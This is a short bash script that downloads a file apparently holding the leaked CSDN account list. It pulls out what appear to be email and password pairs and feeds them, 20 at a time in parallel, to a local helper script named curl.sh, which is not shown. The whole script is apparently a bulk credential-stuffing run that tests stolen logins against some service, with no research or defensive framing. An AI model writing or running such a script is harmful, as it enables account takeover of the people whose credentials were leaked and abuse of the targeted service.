#!/bin/bash
curl http://boj.blog.ustc.edu.cn/wp-content/uploads/2015/04/www.csdn.net.txt 2>/dev/null | \
    awk -F' # ' '{ printf("%s\0%s\0", $3, $2) }' | \
    tr -d '[[:space:]]' | \
    xargs -0 -P 20 -n 2 ./curl.sh
